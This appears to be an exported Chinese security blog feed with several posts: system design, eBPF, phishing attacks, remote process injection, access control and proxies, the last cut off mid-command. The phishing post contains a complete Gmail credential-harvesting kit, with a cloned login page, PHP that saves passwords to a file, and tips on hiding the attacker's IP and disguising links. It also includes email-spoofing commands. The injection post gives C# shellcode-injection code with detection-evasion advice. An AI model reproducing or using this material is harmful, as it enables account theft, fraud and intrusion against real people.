class="headerlink" title="安全性"></a>安全性</h1><p>安全存储、身份验证、如何采取措施保护、免受入侵</p><h1 id="部署模型"><a href="#部署模型" class="headerlink" title="部署模型"></a>部署模型</h1><p>组件很多，如何集成部署</p><h1 id="技术选型"><a href="#技术选型" class="headerlink" title="技术选型"></a>技术选型</h1><p>例如：</p><p>app：react</p><p>前端：django python  docker</p><p>route（引入网关服务，netflix &#x2F; zuul 或者其他的网关服务的组件 but 接下来我们需要全局洞察力引入系统实现负载均衡 NGINX，各个环节随着系统的增长需要可观察性）</p><p>业务逻辑：java spring docker (服务分为专门不同的服务，以便于扩展即为微服务，这也将系统演变为分布式系统，所以需要 route)</p><p>ElasticSearchh Fluently cabana 进行集中加载，所以需要引入集中式追踪，最后的事情是引入prometheus来检查，继续扩展存储部分</p><p>数据库：postgresql docker ): （首先在高规模数据中引入缓存 redis 以便使用正确使用负载，but 需要异步处理所有 MQ 出现了，扩展数据库为分布式数据库，以便于能够进行数据分区 cassandra database）</p><p>模型部署：cloud &#x2F; k8s &#x2F; docker</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>eBPF and Wasm</title>
      <link href="/josyaaa/2022/05/12/eBPF/"/>
      <url>/josyaaa/2022/05/12/eBPF/</url>
      
        <content type="html"><![CDATA[<p>起源于 Linux 内核，可以在操作系统内核中运行沙盒程序并且它用于安全有效地扩展内核的功能，而无需更改内核源代码或加载内核模块。非常奇妙的事情是 eBPF 催生一种全新的软件开发方式，基于这种方式可以对内核、跨多个子系统的处理逻辑均可以进行编程 。</p><p><a href="https://ebpf.io/">eBPF</a></p><ul><li>eBPF 安全</li></ul><p>系统调用过滤、网络级过滤和进程上下文跟踪的各个方面通常由完全独立的系统处理，但 eBPF 允许结合所有方面的可见性和控制，以创建在更多上下文上运行并具有更好控制级别的安全系统。</p><p><a href="https://github.com/falcosecurity/falco">falco</a><br><a href="https://github.com/kubearmor/KubeArmorc">KubeArmorc</a><br><a href="https://github.com/aquasecurity/tracee">tracee</a></p><ul><li>eBPF 跟踪、分析</li></ul><p>将 eBPF 程序附加到跟踪点以及内核和用户应用程序探测点的能力允许对应用程序和系统本身的运行时行为进行前所未有的可见性。通过为应用程序和系统端提供自省能力，可以将两种视图结合起来，从而提供强大而独特的洞察力来解决系统性能问题。</p><p><a href="https://github.com/facebookincubator/katran">katran</a></p><ul><li>eBPF 联网</li></ul><p>eBPF 的可编程性允许添加额外的协议解析器并轻松编程任何转发逻辑以满足不断变化的需求，而无需离开 Linux 内核的数据包处理上下文。JIT 编译器提供的效率提供了接近于本地编译的内核代码的执行性能。</p><ul><li>eBPF 可观察性、监控</li></ul><p>eBPF 不依赖于操作系统公开的静态计数器和计量器，而是支持自定义指标的收集和内核聚合，并基于各种可能的来源生成可见性事件。</p><p><a href="https://github.com/cilium/cilium">cilium</a><br><a href="https://github.com/cilium/hubble">hubble</a></p><h2 id="attack-eBPF"><a href="#attack-eBPF" class="headerlink" title="attack eBPF"></a>attack eBPF</h2><p>近期许多检测、监控软件和性能跟踪工具都是用 eBPF 编写的，并且在云原生空间中，eBPF 得到更多采用。其次 eBPF 的安全性是通过如下层次：</p><p>eBPF 编写结构：<br>Required Privileges<br>(钩子被识别后可以调用bpf系统调用到eBPF程序加载到Liunx内核中)<br>Verifier<br>(验证步骤确保eBPF程序安全)<br>JIT Compilation<br>(即时编译步骤将程序的通用字节码转换为机器特定的指令集，以优化程序性能)<br>Maps<br>(共享收集的信息和存储状态的能力)<br>Helper Calls<br>(将函数调用大帮助函数中)<br>Tail &amp; Function Calls<br>(函数调用允许在ebpf程序中定义和调用函数)</p><hr><p>eBPF 安全性结构：<br>Required Privileges<br>Verifier<br>Hardening<br>Abstracted Runtime Context</p><hr><p><code>mermaid graph TD A[Programs] --&gt; B[Maps] --&gt; C[Events] </code></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>网络钓鱼攻击逻辑</title>
      <link href="/josyaaa/2022/05/12/fish-attack/"/>
      <url>/josyaaa/2022/05/12/fish-attack/</url>
      
        <content type="html"><![CDATA[<ul><li>社会工程已经成为大部分IT部门关注的重点，尤其在疫情期间，大范围的公司受到社会工程、勒索软件的攻击。超过60%的网络攻击的关键因素或主要因素是人为因素并且绝大多数与社会工程相关，其中涉及最多的属于各类的钓鱼邮件攻击。</li></ul><h1 id="网络钓鱼是什么？"><a href="#网络钓鱼是什么？" class="headerlink" title="网络钓鱼是什么？"></a>网络钓鱼是什么？</h1><p>网络钓鱼可以把其定义为：以对收件人施加影响或获得个人信息为目的，发送看似来自权威来源的电子邮件。</p><h1 id="网络钓鱼邮件的主要类型有哪些？"><a href="#网络钓鱼邮件的主要类型有哪些？" class="headerlink" title="网络钓鱼邮件的主要类型有哪些？"></a>网络钓鱼邮件的主要类型有哪些？</h1><ul><li>链接钓鱼：攻击者在邮件内嵌入钓鱼链接，诱导鱼去点开链接登陆虚假的钓鱼网站或者链接直接指向恶意软件</li><li>附件钓鱼：攻击者将病毒等存放于附件中，常见的附件为PDF、Doc、Excel、md等格式的附件</li><li>鱼叉式钓鱼：攻击者针对特定目标进行攻击，目的是窃取具有敏感性的数据</li><li>BEC钓鱼：攻击者伪装成商务邮件，对被攻击者实施商业信息、财务等重要的商务信息资料数据</li><li>二维码钓鱼：攻击者诱导使用二维码扫一扫实施攻击，但是此场景用户处于内网之中</li></ul><h1 id="好的钓鱼攻击的决定性因素有哪些？"><a href="#好的钓鱼攻击的决定性因素有哪些？" class="headerlink" title="好的钓鱼攻击的决定性因素有哪些？"></a>好的钓鱼攻击的决定性因素有哪些？</h1><ul><li>能够激起被攻击者的强烈情绪反应</li><li>致使被攻击者的逻辑思考短路</li></ul><p>钓鱼攻击的本质个人理解为由于收到的这些邮件产生认知偏差，其次沦落为情绪化行为的牺牲品。这里我们需要对情绪化决策流程有认识，这样很大程度避免绝大多数的钓鱼攻击：</p><div>    <span>      <img src="./fish-attack/pn1.png" width="18px">    </span></div><h1 id="周期性的决策过程预防钓鱼攻击怎么做？"><a href="#周期性的决策过程预防钓鱼攻击怎么做？" class="headerlink" title="周期性的决策过程预防钓鱼攻击怎么做？"></a>周期性的决策过程预防钓鱼攻击怎么做？</h1><ul><li>确保正确的理解问题</li><li>尽可能完整的收集信息</li><li>考虑切实可行的选项</li><li>做出决策（而不是缺少上三步直接做出决策）</li><li>评估决策的效果</li></ul><p>更为直接的做法就是在行动之间冷静下问自己个为什么？</p><h1 id="攻击者怎样进行钓鱼攻击呢？"><a href="#攻击者怎样进行钓鱼攻击呢？" class="headerlink" title="攻击者怎样进行钓鱼攻击呢？"></a>攻击者怎样进行钓鱼攻击呢？</h1><div>    <span>      <img src="fish-attack/png2.png" width="18px">    </span></div><p>钓鱼攻击可以从操控的关键节点中理解钓鱼攻击的基础知识，通过了解决策制定、影响、操控得以进行钓鱼攻击。</p><p><strong><strong>建立钓鱼环境</strong></strong></p><ul><li>可以使用网站克隆工具setookit</li></ul><p><img src="/josyaaa/./fish-attack/png3.png" alt="pn3"></p><p>在使用工具使需要选择不同的攻击类型以及需要监听的IP最终直接enter即可实现自动化的操作，填写克隆的网站地址也类似操作。（忽略图上显示出来的IP地址）</p><ul><li>也可以使用专有的钓鱼集成平台gophish</li></ul><p>gophish专门为滲透测试人员涉及的开源网络钓鱼工具，提供快速、轻松地执行网络钓鱼以及安全意识培训的能力，同时gophish对于邮件编辑、网站克隆、数据可视化、批量发送等功能的使用集成，并且实现功能方面的模块化，可以方便用户快速掌握钓鱼工作各部分的原理及运用。</p><p>安装教程及使用可以参考：<a href="https://blog.csdn.net/qq_42939527/article/details/107485116">https://blog.csdn.net/qq_42939527/article/details/107485116</a></p><ul><li>EwoMail建立邮箱服务器</li></ul><p>EwoMail是基于Linux的开源邮件服务器，支持一键搭建，集成了众多优秀稳定的组件，是一个快速部署、简单高效、安全稳定的邮件解决方案，支持电脑和手机的客户端，适合个人或邮箱功能需求少的企业。</p><p>安装教程及使用可以参考：<a href="https://gitcode.net/mirrors/gyxuehu/EwoMail?utm_source=csdn_github_accelerator">https://gitcode.net/mirrors/gyxuehu/EwoMail?utm_source=csdn_github_accelerator</a></p><p><strong><strong>邮件伪造建立</strong></strong></p><ul><li>使用Swaks工具 安装地址：<a href="http://www.jetmore.org/john/code/swaks/">http://www.jetmore.org/john/code/swaks/</a><blockquote><p>#下载文件并解压<br>wget  <a href="http://www.jetmore.org/john/code/swaks/files/swaks-20201014.0.tar.gz">http://www.jetmore.org/john/code/swaks/files/swaks-20201014.0.tar.gz</a><br>tar -zxvf swaks-20201014.0.tar.gz<br>cd swaks-20201014.0&#x2F;</p></blockquote></li></ul><p>#测试邮箱的连通性<br>sudo .&#x2F;swaks –to  *******<a href="mailto:&#55;&#x36;&#x40;&#x71;&#113;&#x2e;&#99;&#111;&#x6d;">&#55;&#x36;&#x40;&#x71;&#113;&#x2e;&#99;&#111;&#x6d;</a></p><ul><li>或者使用SimpleEmailSpoofer的python脚本</li></ul><blockquote><p>git clone <a href="https://github.com/lunarca/SimpleEmailSpoofer.git">https://github.com/lunarca/SimpleEmailSpoofer.git</a><br>cd SimpleEmailSpoofer&#x2F;<br>pip install -r requirements.txt<br>#使用示例<br>.&#x2F;SimpleEmailSpoofer.py -e [Path to Email file] -t [To address] -f [From address] -n [From name] -j [Email subject]<br>#邮箱测试<br>python SimpleEmailSpoofer.py -t a******<a href="mailto:&#116;&#64;&#49;&#x36;&#x33;&#x2e;&#99;&#111;&#x6d;">&#116;&#64;&#49;&#x36;&#x33;&#x2e;&#99;&#111;&#x6d;</a>  -n 管理员 -f <a href="mailto:&#x61;&#x64;&#x6d;&#x69;&#x6e;&#64;&#116;&#101;&#115;&#x74;&#x2e;&#99;&#x6f;&#x6d;">&#x61;&#x64;&#x6d;&#x69;&#x6e;&#64;&#116;&#101;&#115;&#x74;&#x2e;&#99;&#x6f;&#x6d;</a> -j “SimpleEmailSpoofer test”  -e 1.txt</p></blockquote><p><strong><strong>URL、邮件头伪造</strong></strong></p><ul><li>不可否认钓鱼攻击最重要的利用情绪的漏洞来攻击被攻击者的批判性思维以及逻辑能力，由于邮件是精心涉及的恶意邮件，目的是为了让你下载恶意软件、泄漏个人信息或者其他的行为，所以攻击者利用URL、邮件头的伪造进行所谓的Punycode钓鱼攻击（URL、邮件头的伪造详情下篇文章主要谈论），然后就需作为攻击者去实行域名注册的普通操作，域名建立和购买可以去各大云商购买域名。</li><li>由于可能有的公司具有邮件网管域名等检测系统或者其他的入侵检测设备等。但是这些系统或者设备的产品多数是建立黑、白名单可以类比于红黑树结构的检测结构，名单的建立是需要人为进行配置，人本身总会是最大的漏洞，作为攻击者需要多进行些域名的信息收集工作，再对其众多收集到的域名进行解析，寻找一些没有SPF记录的类型、伪造不存在的权威级别的域名，当然前述的域名信息收集肯定是需要黑白名单均收集的状况，在伪造邮件地址时需要能够尝试匹配到名单正则策略等等方式。</li></ul><p><strong><strong>邮件内容伪造</strong></strong></p><p>现实物理世界中最常见的内容还是：</p><p>1、背景调查类型：“有人在对你进行背景调查”  攻击被攻击者的“恐惧、诧异、好奇”<br>2、突发事件类型： &lt;地点&gt; 发生了什么  &lt;灾难&gt; 什么样的内容<br>3、职能工作类型： &lt;职能邀请&gt; 具体时间啊地点<br>4、供应商、内部来源类型</p><p>当然上述邮件内容只是常见的内容结构，当然这样的内容结构以及非常落后了，现在更加高级的做法更多的是多组合攻击，例如将恶意软件与钓鱼等攻击不同排列组合的方式更难以防御的复杂攻击方式。</p><h1 id="更加专业钓鱼工具包选择问题"><a href="#更加专业钓鱼工具包选择问题" class="headerlink" title="更加专业钓鱼工具包选择问题"></a>更加专业钓鱼工具包选择问题</h1><ul><li><p>由于更多的工具软件采用SaaS（软件即服务）、MS（托管服务）、python等等其他语言的程序编码DIY（需要更为底层的原理逻辑）所再选择使用自己合适的工具选型需要思考：<br>1、 使用工具需要什么样的知识积累？<br>2、用户信息的安全性如何？<br>3、工具选型是否有些客观因素阻碍？</p></li><li><p>商业付费钓鱼工具：Rapid7、ThreaatSim、PhishMe、PhishLine</p></li><li><p>开源钓鱼工具：SET、gophish、Phishing Frenzy</p></li></ul><h1 id="钓鱼攻击防御的建立"><a href="#钓鱼攻击防御的建立" class="headerlink" title="钓鱼攻击防御的建立"></a>钓鱼攻击防御的建立</h1><ul><li>普通用户：请谨慎的接受查看信息</li><li>安全人员：IT行业是需要不断学习进步的，把钓鱼攻击等纳入你的安全意识培训技能包中</li><li>企业客户： 结合企业自身发展的需求设定安全演练的需求，从内部意识以及外部预防的角度出发，相信在数字化的不断改造下，基于钓鱼的复杂网络攻击会更加普遍与急切，需要企业客户防患未然。</li></ul><h1 id=""><a href="#" class="headerlink" title=""></a></h1><ul><li>Step 1:</li></ul><p>Go to the gmail.com.  Save the Page as “complet HTML” file</p><ul><li>Step 2:</li></ul><p>Once you save the login page completely, you will see a HTML file and a folder with the name something like Email from google files.There will be two image files namely “google_transparent.gif”,”mail_logo.png”</p><ul><li>Step3:</li></ul><p> Upload those image to tinypic or photobucker.com.  copy the url of each image.</p><ul><li>Step4:</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Open the HTML file in Wordpad.</span><br><span class="line">Search for “google_transparent.gif” (without quotes) and replace it with corresponding url .</span><br><span class="line">Search for “mail_logo.png” (without quotes) and replace it with corresponding url .</span><br></pre></td></tr></table></figure><ul><li>Step 5:</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Search for the</span><br><span class="line"> action=”https://www.google.com/accounts/ServiceLoginAuth”</span><br><span class="line">Replace it with</span><br><span class="line"> action=”http://yoursite urlhere/login.php”</span><br><span class="line">save the file.</span><br></pre></td></tr></table></figure><ul><li>Step6:<br>Now you need to create login.php, you need to open the notepad and type as</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(“Location: https://www.google.com/accounts/ServiceLoginAuth “);</span><br><span class="line">$handle = fopen(“pswrds.txt”, “a”);</span><br><span class="line">foreach($_GET as $variable =&gt; $value) &#123;</span><br><span class="line">fwrite($handle, $variable);</span><br><span class="line">fwrite($handle, “=”);</span><br><span class="line">fwrite($handle, $value);</span><br><span class="line">fwrite($handle, “rn”);</span><br><span class="line">&#125;</span><br><span class="line">fwrite($handle, “rn”);</span><br><span class="line">fclose($handle);</span><br><span class="line">exit;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>save it</p><ul><li>Step 7:</li></ul><p>open the notepad and just save the file as “pswrds.txt” without any contents.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Now upload those three files(namely index.html,login.php,pswrds.txt) in any of subdomain Web hosting site.</span><br><span class="line">Note:  that web hosting service must has php feature.</span><br><span class="line">Use one of these sites:110mb.com, spam.com justfree.com or 007sites.com.</span><br><span class="line"> use this sites through the secure connection sites(so that you can hide your ip address)  like: http://flyproxy.com .  find best secure connection site.</span><br></pre></td></tr></table></figure><ul><li>Step 8:</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">create an email with gmail keyword.</span><br><span class="line"> like : gmailburger@gmail.com</span><br></pre></td></tr></table></figure><ul><li>Step 9:</li></ul><p>Send to victim similar  to ” gmail starts new feature to use this service log in to this page” from that gmail id with link to your phishing web page.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Note:</span><br><span class="line">For user to believe change Your phishing web page url with any of free short url sites.</span><br><span class="line">Like : co.nr, co.cc,cz.cc</span><br><span class="line">This will make users to believe that it is correct url.</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>（远程）进程注入技术</title>
      <link href="/josyaaa/2022/05/12/RED_01/"/>
      <url>/josyaaa/2022/05/12/RED_01/</url>
      
        <content type="html"><![CDATA[<p>（远程）进程注入技术</p><p>VirtualAllocEx&#x2F;WriteProccessMemory&#x2F;CreateRemoteThread</p><ul><li>内存分配</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">VirtualAllocEx (创建零区域，大到足以容纳shellcode，具有RWX权限，API返回内存区域的地址)</span><br><span class="line">// Spawn the target process</span><br><span class="line">var target = new Process</span><br><span class="line">&#123;</span><br><span class="line">    StartInfo = new ProcessStartInfo</span><br><span class="line">    &#123;</span><br><span class="line">        FileName = @&quot;C:\Windows\System32\notepad.exe&quot;,</span><br><span class="line">        CreateNoWindow = true,</span><br><span class="line">        WindowStyle = ProcessWindowStyle.Hidden</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">target.Start();</span><br><span class="line"></span><br><span class="line">// Read in the shellcode</span><br><span class="line">var shellcode = File.ReadAllBytes(@&quot;C:\Payloads\beacon.bin&quot;);</span><br><span class="line"></span><br><span class="line">// Allocate a region of memory</span><br><span class="line">var hMemory = Kernel32.VirtualAllocEx(</span><br><span class="line">    target.Handle,</span><br><span class="line">    IntPtr.Zero,</span><br><span class="line">    shellcode.Length,</span><br><span class="line">    Kernel32.MEM_ALLOCATION_TYPE.MEM_RESERVE | Kernel32.MEM_ALLOCATION_TYPE.MEM_COMMIT,</span><br><span class="line">    Kernel32.MEM_PROTECTION.PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">Console.WriteLine(&quot;Memory:  0x&#123;0:X&#125;&quot;, hMemory);</span><br></pre></td></tr></table></figure><ul><li>write shellcode</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">WriteProcessMemory(指定的缓冲区写入内存区域,此API返回一个布尔值）</span><br><span class="line"></span><br><span class="line">var success = Kernel32.WriteProcessMemory(</span><br><span class="line">    target.Handle,</span><br><span class="line">    hMemory,</span><br><span class="line">    shellcode,</span><br><span class="line">    shellcode.Length,</span><br><span class="line">    out _);</span><br></pre></td></tr></table></figure><ul><li>run shellcode</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">CreateRemoteThread(目标进程中创建执行shellcode新线程，此API返回创建线程的句柄)</span><br><span class="line">var hThread = Kernel32.CreateRemoteThread(</span><br><span class="line">    target.Handle,</span><br><span class="line">    null,</span><br><span class="line">    0,</span><br><span class="line">    hMemory,</span><br><span class="line">    IntPtr.Zero,</span><br><span class="line">    Kernel32.CREATE_THREAD_FLAGS.RUN_IMMEDIATELY,</span><br><span class="line">    out _);</span><br></pre></td></tr></table></figure><h3 id="操作安全"><a href="#操作安全" class="headerlink" title="操作安全"></a>操作安全</h3><ul><li>RWX</li></ul><p>许多人可能会指出的第一个方面是 RWX 的初始内存分配，这对于防御性产品来说可能是一个危险信号。您可以最初将其分配为 RW，编写 shellcode，然后在调用 CreateRemoteThread 之前使用VirtualProtectEx使其成为 RX。这对于像 Beacon 这样的“普通”shellcode 非常有效，但对于 Metasploit 等框架众所周知的“编码”shellcode（如 shikata_ga_nai）则不适用。这是因为这些 shellcode 包含一个存根，它在内存中自行解码，并且这个编码过程需要写入和执行权限，这导致我们回到 RWX。</p><p>Cobalt Strike 反射加载器还有一些可以在 Malleable C2 配置文件中指定的附加选项，例如userwx和cleanup。当设置为 false 时，userwx 将告诉加载程序不要为自己分配新的 RWX 内存（它将选择 RX）；当 cleanup 设置为 true 时，加载器将释放分配的用于加载自身的内存。</p><ul><li>R（w）区域不受模块支持</li></ul><p>如果你进一步检查目标进程中的内存区域，就会看到每个RX区域都由磁盘上的一个模块支持，包含shellcode的区域明显例外。如果使用RWX就很有可能是整个过程中唯一的RWX，这是因为进程从磁盘加载DLL，这种反射DLL注入方式不同会返回到磁盘上的DLL</p><ul><li>线程</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Rasta&gt; Get-InjectedThread</span><br><span class="line">Name                           Value</span><br><span class="line">----                           -----</span><br><span class="line">KernelPath                     C:\Windows\System32\notepad.exe</span><br><span class="line">PathMismatch                   False</span><br><span class="line">AuthenticationPackage</span><br><span class="line">AllocatedMemoryProtection      PAGE_READWRITE</span><br><span class="line">UserName                       \</span><br><span class="line">BaseAddress                    2120897789952</span><br><span class="line">IsUniqueThreadToken            False</span><br><span class="line">CommandLine                    &quot;C:\Windows\System32\notepad.exe&quot;</span><br><span class="line">Size                           4096</span><br><span class="line">ThreadId                       4524</span><br><span class="line">Integrity                      MEDIUM_MANDATORY_LEVEL</span><br><span class="line">SecurityIdentifier             S-1-5-21-3309307143-4008523374-2967785533-1001</span><br><span class="line">MemoryProtection               PAGE_READWRITE</span><br><span class="line">LogonType</span><br><span class="line">ProcessName                    notepad.exe</span><br><span class="line">ProcessId                      9256</span><br><span class="line">MemoryState                    MEM_COMMIT</span><br><span class="line">LogonId</span><br><span class="line">LogonSessionStartTime</span><br><span class="line">Path                           C:\Windows\System32\notepad.exe</span><br><span class="line">BasePriority                   8</span><br><span class="line">MemoryType                     MEM_MAPPED</span><br><span class="line">Privilege                      SeChangeNotifyPrivilege</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>访问控制</title>
      <link href="/josyaaa/2022/05/12/principles%20and%20practice/"/>
      <url>/josyaaa/2022/05/12/principles%20and%20practice/</url>
      
        <content type="html"><![CDATA[<p>访问控制看作计算机安全的核心元素，计算机安全主要目标是防止非授权用户获得对资源的访问，防止合法用户以非授权方式访问资源，使得合法用户以授权方式访问资源</p><hr><table><thead><tr><th>访问控制安全要求</th></tr></thead><tbody><tr><td>限制信息系统对授权用户、代表授权用户的进程或设备(包括其他信息系统)的访问</td></tr><tr><td>限制信息系统对各种类型的事务和授权用户允许执行功能的访问</td></tr></tbody></table><hr><table><thead><tr><th>派生的安全要求 SP 800-171</th></tr></thead><tbody><tr><td>在非联邦信息系统和组织中保护可控的未分类信息，2016年12月 美国国家标准技术研究所（NIST），美国商务部</td></tr></tbody></table><hr><h3 id="访问控制原理"><a href="#访问控制原理" class="headerlink" title="访问控制原理"></a>访问控制原理</h3><p><code>mermaid flowchart LR   A[] --&gt; d1 </code></p><h3 id="访问控制策略"><a href="#访问控制策略" class="headerlink" title="访问控制策略"></a>访问控制策略</h3><table><thead><tr><th>类别</th><th>策略</th></tr></thead><tbody><tr><td>自主访问控制 (discretionary access control,DAC)</td><td>基于请求者的身份和访问规则（授权）控制访问，规定请求者可以或不可以做什么。</td></tr><tr><td>强制访问控制 (mandatory access control,MAC)</td><td>通过比较具有安全许可（表明系统实体有资源访问某种资源）的安全标记（表明系统资源的敏感或关键程度）来访问</td></tr><tr><td>基于角色的访问控制 (role-based access control,RBAC)</td><td>基于用户在系统中所具有的角色和说明各种角色享有哪些访问权的规则来控制访问</td></tr><tr><td>基于属性的访问控制 (attribute-based access control,ABAC)</td><td>基于用户、被访问资源及当前环境条件来控制访问</td></tr></tbody></table><h3 id="访问控制元素"><a href="#访问控制元素" class="headerlink" title="访问控制元素"></a>访问控制元素</h3><table><thead><tr><th>主体（能够访问客体的实体）</th><th>客体（object，是外界对其访问受到控制的资源）</th><th>访问权（access right,描述主体可以访问客体的方式）</th></tr></thead><tbody><tr><td>所有者（owener，资源的创建者）</td><td>实例包含记录、块（block）、页、段（segment）、部分文件、目录等</td><td>读（复制或打印能力）&#x2F;写（添加、修改、删除系统资源）</td></tr><tr><td>组（group，除去分配给所有者的特权）</td><td>访问控制包含比特、字节、字、处理器、通信端口、时钟、网络节点</td><td>执行（用户可以执行指定的程序）&#x2F;删除（用户可以删除某个系统资源）</td></tr><tr><td>世界（world，被授予最少访问的用户）</td><td>被访问控制系统保护的客体的数量和类型取决于访问控制运行的环境及在安全性方面与复杂性、处理器负载、易用性方面之间期望达到的平衡</td><td>创建（创建新的文件、记录或字段）&#x2F;搜索（列出目录中的文件或搜索目录）</td></tr></tbody></table><h2 id="discretionary-access-control-DAC"><a href="#discretionary-access-control-DAC" class="headerlink" title="discretionary access control,DAC"></a>discretionary access control,DAC</h2><h2 id="mandatory-access-control-MAC"><a href="#mandatory-access-control-MAC" class="headerlink" title="mandatory access control,MAC"></a>mandatory access control,MAC</h2><h2 id="role-based-access-control-RBAC"><a href="#role-based-access-control-RBAC" class="headerlink" title="role-based access control,RBAC"></a>role-based access control,RBAC</h2><h2 id="attribute-based-access-control-ABAC"><a href="#attribute-based-access-control-ABAC" class="headerlink" title="attribute-based access control,ABAC"></a>attribute-based access control,ABAC</h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>设置服务器代理</title>
      <link href="/josyaaa/2022/05/12/ip_hiding/"/>
      <url>/josyaaa/2022/05/12/ip_hiding/</url>
      
        <content type="html"><![CDATA[<h1 id="1-透明代理服务器"><a href="#1-透明代理服务器" class="headerlink" title="1. 透明代理服务器"></a>1. 透明代理服务器</h1><p>这种类型的代理服务器将自己标识为代理服务器，并通过 http 标头使原始 IP 地址可用。这些通常用于加速网页浏览，因为它们具有非常好的缓存网站的能力。但他们不会隐藏其用户的 IP。它被广泛称为透明代理，因为它会将您的真实 IP 地址暴露给网络。这种类型的代理服务器不会隐藏您的 IP 地址。</p><h1 id="2-匿名代理服务器"><a href="#2-匿名代理服务器" class="headerlink" title="2.匿名代理服务器"></a>2.匿名代理服务器</h1><p>这种类型的代理服务器将自己标识为代理服务器，但不会使原始IP地址可用。这种类型的代理服务器是可检测的，但为大多数用户提供了合理的匿名性。这种类型的代理服务器将隐藏您的 IP 地址。</p><h1 id="3-扭曲代理服务器"><a href="#3-扭曲代理服务器" class="headerlink" title="3. 扭曲代理服务器"></a>3. 扭曲代理服务器</h1><p>这种类型的代理服务器将自己标识为代理服务器，但通过 http 标头提供了不正确的原始 IP 地址。这种类型的代理服务器将隐藏您的 IP 地址。</p><h1 id="4-高匿名代理服务器（精英代理）"><a href="#4-高匿名代理服务器（精英代理）" class="headerlink" title="4. 高匿名代理服务器（精英代理）"></a>4. 高匿名代理服务器（精英代理）</h1><p>这种类型的代理服务器不将自己标识为代理服务器，也不提供原始 IP 地址。这种类型的代理服务器会隐藏您的 IP 地址。所以这是屏蔽您的 IP 的最佳方式。</p><p><strong>High Anonymity Proxy or Elite Proxy is the best to hide your IP</strong></p><h2 id="IP"><a href="#IP" class="headerlink" title="IP"></a>IP</h2><ul><li>第1步：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;</span><br><span class="line">现在转到Star并单击Run，然后键入“CMD”并按Enter。</span><br><span class="line">命令提示符将打开。</span><br></pre></td></tr></table></figure><ul><li>第 2 步：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&gt;输入 cmd 为“ nbtstat -a IPaddressOfVictim”  ，然后按 Enter。</span><br><span class="line">----------------------------------------------------------</span><br><span class="line">例如：</span><br><span class="line">             nbstat -a 223.222.222.222</span><br><span 